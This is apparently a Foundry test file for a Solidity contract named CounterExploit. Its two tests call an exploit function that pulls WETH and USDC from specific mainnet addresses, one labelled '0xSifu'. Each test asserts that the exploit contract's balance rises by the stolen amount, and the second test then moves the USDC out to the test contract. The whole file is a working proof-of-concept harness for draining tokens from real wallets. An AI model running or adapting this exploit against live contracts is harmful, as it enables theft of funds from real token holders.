// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/CounterExploit.sol";

interface IERC20 {
    function balanceOf(address spender) external returns (uint256);
    function transferFrom(address,address,uint256) external;
}

contract CounterTest is Test {
    CounterExploit public CE;

    function setUp() public {
        CE = new CounterExploit();
    }

    function testSifu() public {
        uint256 initialBalance = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2).balanceOf(address(CE));
        CE.exploit(
            100_000_000_000_000_000_000,
            0,
            0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // weth
            0x31d3243CfB54B34Fc9C73e1CB1137124bD6B13E1 // 0xSifu
        );
        uint256 afterBalance = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2).balanceOf(address(CE));
        assert(initialBalance + 100_000_000_000_000_000_000 == afterBalance);
    }

    function testNew() public {
        uint256 initialBalance = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48).balanceOf(address(CE));
        CE.exploit(
            9870000,
            0,
            0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, // usdc?
            0xcbE23d2CFAbd44CC15Bc6ad4cAB81aa1820498da // random
        );
        uint256 afterBalance = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48).balanceOf(address(CE));
        assert(initialBalance + 9870000 == afterBalance);

        CE.approve(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, 9870000);
        IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48).transferFrom(
            address(CE),
            address(this),
            9870000
        );
        assert(9870000 == IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48).balanceOf(address(this)));
    }
}
